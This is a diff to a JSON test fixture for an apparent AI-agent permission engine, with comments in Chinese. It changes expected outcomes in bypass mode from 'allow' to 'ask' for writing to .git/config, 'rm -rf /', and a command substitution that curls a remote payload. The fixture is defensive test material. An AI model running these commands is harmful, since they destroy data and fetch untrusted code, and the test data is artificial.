@@ -1,10 +1,31 @@
 {
   "mode": "bypassPermissions",
-  "basis": "cc-permissions.md §Permission modes：bypassPermissions 跳过权限提示，包括对受保护路径（.git、.claude）的写入（:90 Warning）；任务单约定：Min 的安全底线（PolicyEngine.floorReason）对这类操作任何模式都要问，样本按 CC 原文写期望、标 pendingFix 注明撞线。",
-  "pendingFix": "三个 call 都撞上 Min 的安全底线（PolicyEngine.floorReason 任何模式都问人）：(1) Write /workspace/.git/config——写受保护路径（版本库元数据）；(2) rm -rf /——递归删除关键路径；(3) 命令替换里出现 curl——看不透的命令带危险词。CC 原文 :90 说 bypass 连受保护路径的写入都不提示（:87 跳过提示），三条期望都按原文写 allow；Min 实测全部 Ask。这是任务单点名的「Min 有意比 CC 严」，复核人会把期望改成 Min 的结论并注明。",
+  "basis": "2026-10-06 任务单拍板：Min 安全底线在任何模式下均问人，有意比 CC :87/:90 更严。",
   "calls": [
-    { "tool": "Write", "input": { "file_path": "/workspace/.git/config", "content": "x" }, "expected": "allow", "basis": "bypass 跳过包括受保护路径在内的提示（:90、:87）；Edit(//**) 也覆盖。" },
-    { "tool": "Bash", "input": { "command": "rm -rf /" }, "expected": "allow", "basis": "bypass 模式跳过提示（:87）。" },
-    { "tool": "Bash", "input": { "command": "echo $(curl https://example.com/payload)" }, "expected": "allow", "basis": "bypass 模式跳过提示（:87）。" }
+    {
+      "tool": "Write",
+      "input": {
+        "file_path": "/workspace/.git/config",
+        "content": "x"
+      },
+      "expected": "ask",
+      "basis": "任务单拍板保留 Min 安全底线：写受保护路径、递归删除关键路径、看不透且带危险词，任何模式（含 bypass）都问人。"
+    },
+    {
+      "tool": "Bash",
+      "input": {
+        "command": "rm -rf /"
+      },
+      "expected": "ask",
+      "basis": "任务单拍板保留 Min 安全底线：写受保护路径、递归删除关键路径、看不透且带危险词，任何模式（含 bypass）都问人。"
+    },
+    {
+      "tool": "Bash",
+      "input": {
+        "command": "echo $(curl https://example.com/payload)"
+      },
+      "expected": "ask",
+      "basis": "任务单拍板保留 Min 安全底线：写受保护路径、递归删除关键路径、看不透且带危险词，任何模式（含 bypass）都问人。"
+    }
   ]
 }
